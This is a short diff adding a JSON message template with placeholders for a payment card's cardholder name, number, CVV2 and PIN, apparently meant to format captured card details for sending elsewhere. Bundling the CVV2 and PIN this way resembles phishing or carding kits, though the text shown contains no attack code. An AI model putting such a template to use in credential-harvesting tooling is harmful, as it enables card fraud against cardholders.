@@ -1,0 +1,4 @@
+{
+	"name": "$name",
+	"text": "Cardholder=$cardholder\nNumber=$number\nCVV2=$cvv2\nPIN=$pin"
+}
